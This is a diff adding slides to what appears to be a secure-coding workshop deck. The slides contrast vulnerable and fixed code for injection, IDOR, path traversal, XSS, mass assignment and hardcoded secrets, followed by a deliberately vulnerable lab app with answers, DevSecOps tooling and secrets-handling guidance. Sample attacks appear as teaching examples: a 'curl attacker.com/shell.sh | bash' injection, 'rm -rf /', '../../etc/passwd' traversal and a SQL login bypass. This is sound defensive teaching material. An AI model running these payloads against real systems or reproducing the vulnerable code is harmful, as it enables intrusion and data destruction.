+<!-- ═══════════════════════════════════════════════════════ 10 IDOR -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 3 / 8</div>
+      <h2 class="slide-title">IDOR <span style="color:var(--muted);font-weight:400;font-size:18px">· Express.js — Broken Object Level Authorization</span></h2>
+    </div>
+    <span class="badge badge-orange">HIGH</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="f">app</span>.<span class="f">get</span>(<span class="s">'/invoice/:id'</span>, authenticate,
+  <span class="k">async</span> (req, res) => {
+    <span class="c">// ❌ No ownership check</span>
+    <span class="c">// Any user can read any invoice</span>
+    <span class="k">const</span> invoice = <span class="k">await</span> <span class="n">Invoice</span>
+      .<span class="f">findById</span>(req.params.id);
+    res.<span class="f">json</span>(invoice);
+  }
+);</pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="f">app</span>.<span class="f">get</span>(<span class="s">'/invoice/:id'</span>, authenticate,
+  <span class="k">async</span> (req, res) => {
+    <span class="c">// ✅ Scoped to authenticated user</span>
+    <span class="k">const</span> invoice = <span class="k">await</span> <span class="n">Invoice</span>.<span class="f">findOne</span>({
+      <span class="good">_id: req.params.id,
+      ownerId: req.user.id</span>
+    });
+    <span class="k">if</span> (!invoice) <span class="k">return</span> res.<span class="f">status</span>(<span class="n">403</span>)
+      .<span class="f">json</span>({ error: <span class="s">'Forbidden'</span> });
+  }
+);</pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚡ ATTACK:</span><span class="txt">Authenticated user changes :id to another user's invoice ID — full read access to all invoices</span></div>
+    <div class="insight-banner"><span class="lbl">💡 KEY INSIGHT:</span>Authentication ≠ Authorization. Always scope DB queries to the requesting user's identity.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 11 CMD INJECTION -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 4 / 8</div>
+      <h2 class="slide-title">Command Injection <span style="color:var(--muted);font-weight:400;font-size:18px">· Python — shell=True</span></h2>
+    </div>
+    <span class="badge badge-red">CRITICAL</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="k">import</span> subprocess
+
+filename = request.args.<span class="f">get</span>(<span class="s">'file'</span>)
+
+<span class="c"># ❌ shell=True passes string to /bin/sh</span>
+subprocess.<span class="f">run</span>(
+    <span class="bad">f"convert {filename} output.pdf"</span>,
+    <span class="bad">shell=True</span>
+)
+<span class="c"># Attack: filename = "img.png; rm -rf /"</span></pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="k">import</span> subprocess
+
+filename = request.args.<span class="f">get</span>(<span class="s">'file'</span>)
+
+<span class="c"># ✅ List form — no shell interpolation</span>
+subprocess.<span class="f">run</span>(
+    <span class="good">["convert", filename, "output.pdf"]</span>
+    <span class="c"># shell=False by default</span>
+)
+<span class="c"># filename passed as data, not code</span></pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚡ ATTACK:</span><span class="txt">filename=image.png; curl attacker.com/shell.sh | bash  →  arbitrary OS command execution</span></div>
+    <div class="insight-banner"><span class="lbl">💡 KEY INSIGHT:</span><code style="color:var(--orange)">shell=True</code> evaluates the whole string in /bin/sh. List form passes args directly to the OS — no interpretation possible.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 12 PATH TRAVERSAL -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 5 / 8</div>
+      <h2 class="slide-title">Path Traversal <span style="color:var(--muted);font-weight:400;font-size:18px">· Python FastAPI — File Download</span></h2>
+    </div>
+    <span class="badge badge-orange">HIGH</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="k">@</span><span class="f">app.get</span>(<span class="s">"/download"</span>)
+<span class="k">def</span> <span class="f">download</span>(filename: <span class="n">str</span>):
+    <span class="c"># ❌ User controls the path</span>
+    <span class="k">return</span> <span class="f">FileResponse</span>(
+        <span class="bad">f"/app/uploads/{filename}"</span>
+    )
+
+<span class="c"># ?filename=../../etc/passwd</span>
+<span class="c"># ?filename=../../.env</span></pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="k">import</span> os
+<span class="k">@</span><span class="f">app.get</span>(<span class="s">"/download"</span>)
+<span class="k">def</span> <span class="f">download</span>(filename: <span class="n">str</span>):
+    safe_base = <span class="s">"/app/uploads"</span>
+    requested = os.path.<span class="f">realpath</span>(
+        os.path.<span class="f">join</span>(safe_base, filename)
+    )
+    <span class="c"># ✅ Confine to safe directory</span>
+    <span class="k">if not</span> requested.<span class="f">startswith</span>(safe_base):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(<span class="n">400</span>)
+    <span class="k">return</span> <span class="f">FileResponse</span>(requested)</pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚡ ATTACK:</span><span class="txt">?filename=../../etc/passwd  or  ../../.env  →  arbitrary file read anywhere on filesystem</span></div>
+    <div class="insight-banner"><span class="lbl">💡 KEY INSIGHT:</span><code style="color:var(--orange)">os.path.realpath</code> resolves all <code style="color:var(--orange)">..</code> sequences. Always verify the resolved path starts with your allowed base.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 13 XSS + MASS ASSIGN -->
+<section class="slide">
+  <div class="slide-header" style="margin-bottom:10px">
+    <div style="display:flex;align-items:center;gap:12px">
+      <div><div class="slide-tag">Vulnerabilities 6 &amp; 7 / 8</div>
+      <h2 class="slide-title">XSS &amp; Mass Assignment <span style="color:var(--muted);font-weight:400;font-size:18px">· React / Mongoose</span></h2></div>
+      <span class="badge badge-orange" style="margin-left:auto">HIGH</span>
+    </div>
+  </div>
+  <div class="vuln-layout" style="gap:16px">
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div style="font-family:var(--font-head);font-weight:700;font-size:13px;color:var(--red)">XSS — dangerouslySetInnerHTML</div>
+      <div class="code-wrap" style="flex:1">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="c">// ❌ User HTML injected directly</span>
+<span class="k">function</span> <span class="f">Comment</span>({ text }) {
+  <span class="k">return</span> &lt;<span class="n">div</span>
+    <span class="bad">dangerouslySetInnerHTML={{__html: text}}</span>
+  /&gt;;
+}</pre>
+      </div>
+      <div class="code-wrap" style="flex:1">
+        <div class="code-bar"><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="k">import</span> <span class="n">DOMPurify</span> <span class="k">from</span> <span class="s">'dompurify'</span>;
+<span class="k">function</span> <span class="f">Comment</span>({ text }) {
+  <span class="k">const</span> clean = <span class="good">DOMPurify.<span class="f">sanitize</span>(text)</span>;
+  <span class="k">return</span> &lt;<span class="n">div</span>
+    dangerouslySetInnerHTML={{__html: clean}}
+  /&gt;;
+}</pre>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div style="font-family:var(--font-head);font-weight:700;font-size:13px;color:var(--orange)">Mass Assignment — Mongoose</div>
+      <div class="code-wrap" style="flex:1">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="c">// ❌ Entire body passed to DB update</span>
+<span class="f">app</span>.<span class="f">post</span>(<span class="s">'/update-profile'</span>, auth,
+  <span class="k">async</span> (req, res) => {
+    <span class="k">await</span> <span class="n">User</span>.<span class="f">findByIdAndUpdate</span>(
+      req.user.id, <span class="bad">req.body</span>
+    ); <span class="c">// Attack: {"isAdmin": true}</span>
+  });</pre>
+      </div>
+      <div class="code-wrap" style="flex:1">
+        <div class="code-bar"><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="c">// ✅ Allowlist safe fields only</span>
+<span class="f">app</span>.<span class="f">post</span>(<span class="s">'/update-profile'</span>, auth,
+  <span class="k">async</span> (req, res) => {
+    <span class="k">const</span> { <span class="good">name, bio, avatarUrl</span> } = req.body;
+    <span class="k">await</span> <span class="n">User</span>.<span class="f">findByIdAndUpdate</span>(
+      req.user.id, <span class="good">{ name, bio, avatarUrl }</span>
+    );
+  });</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 14 SECRETS IN CODE -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 8 / 8</div>
+      <h2 class="slide-title">Hardcoded Secrets <span style="color:var(--muted);font-weight:400;font-size:18px">· The bug that lives forever in git history</span></h2>
+    </div>
+    <span class="badge" style="background:var(--red);color:#000">NEVER DO THIS</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="c">// ❌ JavaScript</span>
+<span class="k">const</span> stripe = <span class="f">require</span>(<span class="s">'stripe'</span>)(
+  <span class="bad">'sk_test_1234567890FAKEKEY'</span>
+);
+
+<span class="c"># ❌ Python</span>
+<span class="bad">DB_URL = 'postgres://admin:hunter2@prod..'</span>
+
+<span class="c">// ❌ Java</span>
+<span class="bad">String key = "AIzaSyD_abc123secret";</span></pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="c">// ✅ JavaScript</span>
+<span class="k">const</span> stripe = <span class="f">require</span>(<span class="s">'stripe'</span>)(
+  <span class="good">process.env.STRIPE_SECRET_KEY</span>
+);
+
+<span class="c"># ✅ Python</span>
+<span class="good">DB_URL = os.environ['DATABASE_URL']</span>
+
+<span class="c">// ✅ Inject in CI from:</span>
+<span class="c">// Vault / AWS Secrets Manager / GH Secrets</span></pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚠ WARNING:</span><span class="txt">Even if you delete the line, it's in git history forever. Rotation + BFG Repo-Cleaner required.</span></div>
+    <div class="insight-banner"><span class="lbl">💡 RULE:</span>Source from env vars or a secrets manager. Add gitleaks as pre-commit hook. Rotate immediately if any secret touched a repo.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 15 SECTION: LAB -->
+<section class="slide section-slide">
+  <div class="bg-num">03</div>
+  <div class="block-label">Block 3 · 30 Minutes</div>
+  <h2>Hands-On<br>Lab</h2>
+  <div class="section-sub">⏱  20 minutes to find all bugs · 10 minutes debrief</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 16 LAB CODE -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
+    <div>
+      <div class="slide-tag">Block 3 · Lab Challenge</div>
+      <h2 class="slide-title">Find All Security Issues</h2>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center">
+      <span id="timer-display" style="font-family:var(--font-mono);font-size:22px;color:var(--orange);font-weight:700">20:00</span>
+      <button onclick="startTimer()" style="background:var(--orange);border:none;border-radius:4px;padding:6px 14px;font-family:var(--font-mono);font-size:11px;font-weight:700;color:#000;cursor:pointer">START</button>
+      <button onclick="resetTimer()" style="background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:6px 12px;font-family:var(--font-mono);font-size:11px;color:var(--muted);cursor:pointer">RESET</button>
+    </div>
+  </div>
+  <div class="code-wrap code-scroll" style="flex:1">
+    <div class="code-bar">
+      <div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div>
+      <span style="font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:8px">vulnerable-app.js</span>
+      <span style="font-family:var(--font-mono);font-size:10px;color:var(--orange);margin-left:auto">How many bugs can you find?</span>
+    </div>
+    <pre><span class="k">const</span> express = <span class="f">require</span>(<span class="s">'express'</span>);
+<span class="k">const</span> { exec } = <span class="f">require</span>(<span class="s">'child_process'</span>);
+<span class="k">const</span> jwt = <span class="f">require</span>(<span class="s">'jsonwebtoken'</span>);
+<span class="k">const</span> db = <span class="f">require</span>(<span class="s">'./db'</span>);
+<span class="k">const</span> app = <span class="f">express</span>();
+app.<span class="f">use</span>(express.<span class="f">json</span>());
+<span class="k">const</span> SECRET = <span class="s">'supersecret123'</span>;            <span class="c">// ← anything here?</span>
+
+<span class="c">// ─── Endpoint 1 ─────────────────────────────────────</span>
+app.<span class="f">get</span>(<span class="s">'/ping'</span>, (req, res) => {
+  <span class="k">const</span> host = req.query.host;
+  <span class="f">exec</span>(<span class="s">`ping -c 1 ${host}`</span>, (err, stdout) => {  <span class="c">// ← safe?</span>
+    res.<span class="f">send</span>(stdout);
+  });
+});
+
+<span class="c">// ─── Endpoint 2 ─────────────────────────────────────</span>
+app.<span class="f">post</span>(<span class="s">'/login'</span>, <span class="k">async</span> (req, res) => {
+  <span class="k">const</span> { username, password } = req.body;
+  <span class="k">const</span> user = <span class="k">await</span> db.<span class="f">query</span>(                   <span class="c">// ← notice anything?</span>
+    <span class="s">`SELECT * FROM users WHERE username='${username}' AND password='${password}'`</span>
+  );
+  <span class="k">if</span> (user.length) {
+    <span class="k">const</span> token = jwt.<span class="f">sign</span>({ id: user[<span class="n">0</span>].id, role: user[<span class="n">0</span>].role }, SECRET);
+    res.<span class="f">json</span>({ token });
+  } <span class="k">else</span> { res.<span class="f">status</span>(<span class="n">401</span>).<span class="f">send</span>(<span class="s">'Invalid'</span>); }
+});
+
+<span class="c">// ─── Endpoint 3 ─────────────────────────────────────</span>
+app.<span class="f">get</span>(<span class="s">'/report/:id'</span>, (req, res) => {
+  <span class="k">const</span> token = req.headers.authorization;
+  jwt.<span class="f">verify</span>(token, SECRET, { <span class="bad">algorithms: []</span> }); <span class="c">// ← algorithms: [] ?</span>
+  <span class="k">const</span> report = db.<span class="f">query</span>(                        <span class="c">// ← ownership check?</span>
+    <span class="s">`SELECT * FROM reports WHERE id=${req.params.id}`</span>
+  );
+  res.<span class="f">json</span>(report);
+});
+
+<span class="c">// ─── Endpoint 4 ─────────────────────────────────────</span>
+app.<span class="f">post</span>(<span class="s">'/upload'</span>, (req, res) => {
+  <span class="k">const</span> { filename, content } = req.body;
+  <span class="k">const</span> fs = <span class="f">require</span>(<span class="s">'fs'</span>);
+  fs.<span class="f">writeFileSync</span>(<span class="s">`/var/app/uploads/${filename}`</span>, content); <span class="c">// ← path safe?</span>
+  res.<span class="f">send</span>(<span class="s">'Uploaded'</span>);
+});</pre>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 17 LAB ANSWERS -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Block 3 · Debrief</div>
+    <h2 class="slide-title">Lab Answers — All 8 Findings</h2>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;flex:1" class="stagger">
+    <div class="finding-card" style="--fc:var(--red)"><style>.finding-card:nth-child(1)::before{background:var(--red)}</style>
+      <div class="finding-head"><div class="finding-loc">Line 7 · Global</div><span class="badge badge-red">CRITICAL</span></div>
+      <div class="finding-name">Hardcoded Secret</div>
+      <div class="finding-detail"><code>const SECRET = 'supersecret123'</code> — baked into code and git history</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(2)::before{background:var(--red)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 1 · /ping</div><span class="badge badge-red">CRITICAL</span></div>
+      <div class="finding-name">Command Injection</div>
+      <div class="finding-detail"><code>exec(`ping -c 1 ${host}`)</code> — arbitrary OS command execution</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(3)::before{background:var(--red)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 2 · /login</div><span class="badge badge-red">CRITICAL</span></div>
+      <div class="finding-name">SQL Injection (login)</div>
+      <div class="finding-detail">Template literal in query — bypass with <code>' OR '1'='1</code> or dump any data</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(4)::before{background:var(--orange)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 2 · /login</div><span class="badge badge-orange">HIGH</span></div>
+      <div class="finding-name">Plaintext Password Comparison</div>
+      <div class="finding-detail">Password passed raw into SQL — should be hashed with bcrypt/argon2</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(5)::before{background:var(--red)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 3 · /report</div><span class="badge badge-red">CRITICAL</span></div>
+      <div class="finding-name">JWT Algorithm Confusion</div>
+      <div class="finding-detail"><code>algorithms: []</code> accepts ANY algorithm including <code>none</code> — forge any token</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(6)::before{background:var(--orange)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 3 · /report</div><span class="badge badge-orange">HIGH</span></div>
+      <div class="finding-name">SQL Injection (report)</div>
+      <div class="finding-detail">Template literal with <code>req.params.id</code> — no parameterization, no scope</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(7)::before{background:var(--orange)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 3 · /report</div><span class="badge badge-orange">HIGH</span></div>
+      <div class="finding-name">Missing Authorization</div>
+      <div class="finding-detail">JWT verified but ownership never checked — any user reads any report</div>
+    </div>
+    <div class="finding-card"><style>.finding-card:nth-child(8)::before{background:var(--orange)}</style>
+      <div class="finding-head"><div class="finding-loc">Endpoint 4 · /upload</div><span class="badge badge-orange">HIGH</span></div>
+      <div class="finding-name">Path Traversal (Write)</div>
+      <div class="finding-detail">User-controlled filename → writeFileSync — write anywhere on the filesystem</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 18 SECTION: DEVSECOPS -->
+<section class="slide section-slide">
+  <div class="bg-num">04</div>
+  <div class="block-label">Block 4 · 25 Minutes</div>
+  <h2>DevSecOps<br>Pipeline</h2>
+  <div class="section-sub">IDE → Pre-commit → PR → CI → Registry → Runtime</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 19 PIPELINE OVERVIEW -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Block 4 · Pipeline</div>
+    <h2 class="slide-title">Where Security Gates Live</h2>
+    <div class="slide-sub">Shift left — catching issues earlier is always cheaper to fix</div>
+  </div>
+  <div class="pipeline-stages stagger">
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--blue)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--blue)">1</div>
+        <div class="stage-name">IDE / Local</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--blue)">Semgrep</div>
+          <div class="stage-tool" style="color:var(--blue)">ESLint Security</div>
+          <div class="stage-tool" style="color:var(--blue)">Git Hooks</div>
+        </div>
+      </div>
+    </div>
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--teal)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--teal)">2</div>
+        <div class="stage-name">Pre-Commit</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--teal)">gitleaks</div>
+          <div class="stage-tool" style="color:var(--teal)">detect-secrets</div>
+          <div class="stage-tool" style="color:var(--teal)">Checkov</div>
+        </div>
+      </div>
+    </div>
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--purple)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--purple)">3</div>
+        <div class="stage-name">PR / Review</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--purple)">SAST Scan</div>
+          <div class="stage-tool" style="color:var(--purple)">CodeQL</div>
+          <div class="stage-tool" style="color:var(--purple)">Semgrep CI</div>
+        </div>
+      </div>
+    </div>
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--orange)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--orange)">4</div>
+        <div class="stage-name">CI Pipeline</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--orange)">npm audit</div>
+          <div class="stage-tool" style="color:var(--orange)">Trivy FS</div>
+          <div class="stage-tool" style="color:var(--orange)">OWASP DC</div>
+        </div>
+      </div>
+    </div>
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--yellow)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--yellow)">5</div>
+        <div class="stage-name">Registry</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--yellow)">Trivy Image</div>
+          <div class="stage-tool" style="color:var(--yellow)">Grype</div>
+          <div class="stage-tool" style="color:var(--yellow)">Cosign Sign</div>
+        </div>
+      </div>
+    </div>
+    <div class="stage-card">
+      <div class="stage-top" style="background:var(--red)"></div>
+      <div class="stage-body">
+        <div class="stage-num" style="background:var(--red)">6</div>
+        <div class="stage-name">Runtime</div>
+        <div class="stage-tools">
+          <div class="stage-tool" style="color:var(--red)">Falco</div>
+          <div class="stage-tool" style="color:var(--red)">GuardDuty</div>
+          <div class="stage-tool" style="color:var(--red)">WAF Rules</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div style="margin-top:14px;font-family:var(--font-mono);font-size:11px;color:var(--muted)">← SHIFT LEFT — cost of finding a bug: $1 in IDE · $10 in PR · $100 in CI · $1000 in production</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 20 GH ACTIONS YAML -->
+<section class="slide">
+  <div class="slide-header" style="margin-bottom:10px">
+    <div class="slide-tag">Block 4 · CI / GitHub Actions</div>
+    <h2 class="slide-title">Security Workflow YAML</h2>
+    <div class="slide-sub">Drop into <code style="color:var(--orange);font-size:12px">.github/workflows/security.yml</code></div>
+  </div>
+  <div class="code-wrap code-scroll" style="flex:1">
+    <div class="code-bar">
+      <div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div>
+      <span style="font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:8px">.github/workflows/security.yml</span>
+    </div>
+    <pre><span class="n">name</span>: Security Scan
+<span class="n">on</span>: [pull_request]
+
+<span class="n">jobs</span>:
+  <span class="f">security</span>:
+    <span class="n">runs-on</span>: ubuntu-latest
+    <span class="n">steps</span>:
+      - <span class="n">uses</span>: actions/checkout@v4
+
+      - <span class="n">name</span>: Secret Scanning
+        <span class="n">uses</span>: <span class="good">gitleaks/gitleaks-action@v2</span>
+
+      - <span class="n">name</span>: SAST with Semgrep
+        <span class="n">uses</span>: <span class="good">returntocorp/semgrep-action@v1</span>
+        <span class="n">with</span>:
+          <span class="n">config</span>: p/owasp-top-ten
+
+      - <span class="n">name</span>: Dependency Audit
+        <span class="n">run</span>: <span class="good">npm audit --audit-level=high</span>
+
+      - <span class="n">name</span>: Container Vulnerability Scan
+        <span class="n">uses</span>: <span class="good">aquasecurity/trivy-action@master</span>
+        <span class="n">with</span>:
+          <span class="n">image-ref</span>: myapp:${{ github.sha }}
+          <span class="n">severity</span>: HIGH,CRITICAL
+          <span class="n">exit-code</span>: <span class="s">'1'</span>        <span class="c"># fail the PR on findings</span>
+
+      - <span class="n">name</span>: IaC Scan (Terraform / K8s)
+        <span class="n">uses</span>: <span class="good">bridgecrewio/checkov-action@master</span></pre>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 21 SECTION: SECRETS -->
+<section class="slide section-slide">
+  <div class="bg-num">05</div>
+  <div class="block-label">Block 5 · 20 Minutes</div>
+  <h2>Secrets<br>Management</h2>
+  <div class="section-sub">Files that must never reach GitHub · Every modern stack</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 22 SECRET FILES BY STACK -->
+<section class="slide">
+  <div class="slide-header" style="margin-bottom:12px">
+    <div class="slide-tag">Block 5 · Secrets</div>
+    <h2 class="slide-title">Secret Files by Stack</h2>
+    <div class="slide-sub">If any of these are in your repo, stop and rotate immediately</div>
+  </div>
+  <div class="grid-2x3 stagger">
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--green)">Node.js / JS / TS</div>
+      <ul>
+        <li style="color:var(--green)">.env, .env.local, .env.production</li>
+        <li style="color:var(--green)">serviceAccountKey.json</li>
+        <li style="color:var(--green)">.npmrc (with _authToken)</li>
+        <li style="color:var(--green)">firebase.json (with tokens)</li>
+      </ul>
+    </div>
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--blue)">Python</div>
+      <ul>
+        <li style="color:var(--blue)">.env / secrets.toml</li>
+        <li style="color:var(--blue)">credentials.json, token.json</li>
+        <li style="color:var(--blue)">config.py (if has secrets)</li>
+        <li style="color:var(--blue)">*.pem, *.key</li>
+      </ul>
+    </div>
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--orange)">Java / Spring</div>
+      <ul>
+        <li style="color:var(--orange)">application.yml / .properties</li>
+        <li style="color:var(--orange)">application-prod.yml</li>
+        <li style="color:var(--orange)">*.jks, *.p12, *.pfx</li>
+        <li style="color:var(--orange)">gradle.properties</li>
+      </ul>
+    </div>
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--red)">Ruby on Rails</div>
+      <ul>
+        <li style="color:var(--red)">config/master.key ← NEVER</li>
+        <li style="color:var(--red)">config/credentials.yml.enc</li>
+        <li style="color:var(--red)">config/database.yml</li>
+        <li style="color:var(--red)">.env</li>
+      </ul>
+    </div>
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--purple)">IaC / DevOps</div>
+      <ul>
+        <li style="color:var(--purple)">terraform.tfvars</li>
+        <li style="color:var(--purple)">*.tfstate, *.tfstate.backup</li>
+        <li style="color:var(--purple)">kubeconfig / ~/.kube/config</li>
+        <li style="color:var(--purple)">ansible vault_password_file</li>
+      </ul>
+    </div>
+    <div class="secret-stack">
+      <div class="secret-stack-head" style="color:var(--yellow)">Cloud / SSH Keys</div>
+      <ul>
+        <li style="color:var(--yellow)">~/.aws/credentials</li>
+        <li style="color:var(--yellow)">gcloud ADC credentials.json</li>
+        <li style="color:var(--yellow)">id_rsa, id_ed25519</li>
+        <li style="color:var(--yellow)">google-services.json (Android)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 23 GITIGNORE -->
+<section class="slide">
+  <div class="slide-header" style="margin-bottom:10px">
+    <div class="slide-tag">Block 5 · Secrets</div>
+    <h2 class="slide-title">Security .gitignore Template</h2>
+    <div class="slide-sub">Add to every project — the minimum viable secrets barrier</div>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;flex:1">
+    <div class="code-wrap code-scroll">
+      <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span style="font-family:var(--font-mono);font-size:10px;color:var(--muted);margin-left:8px">.gitignore — secrets &amp; creds</span></div>
+      <pre><span class="c"># Secrets &amp; credentials</span>
+<span class="good">.env
+.env.*
+!.env.example</span>      <span class="c"># keep the template</span>
+<span class="good">*.pem
+*.key
+*.p12
+*.pfx
+*.jks
+*.keystore</span>
+<span class="good">serviceAccountKey.json
+google-services.json
+GoogleService-Info.plist
+credentials.json
+token.json
+secrets.json
+config/master.key</span></pre>
+    </div>
+    <div class="code-wrap code-scroll">
